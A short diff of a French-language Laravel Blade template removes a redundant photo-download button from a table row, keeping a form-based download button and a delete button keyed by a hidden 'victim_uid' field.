@@ -207,7 +207,6 @@
                                                                 <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                                                 <button type="submit" class="btn btn-success">Télécharger</button>
                                                             </form>
-                                                            <button type="button" class="btn btn-success" href="/photos/dl/{{$picture->id}}">Télécharger</button>
                                                             <button type="button" class="btn btn-danger">Supprimer</button>
                                                         </td>
                                                     </tr>
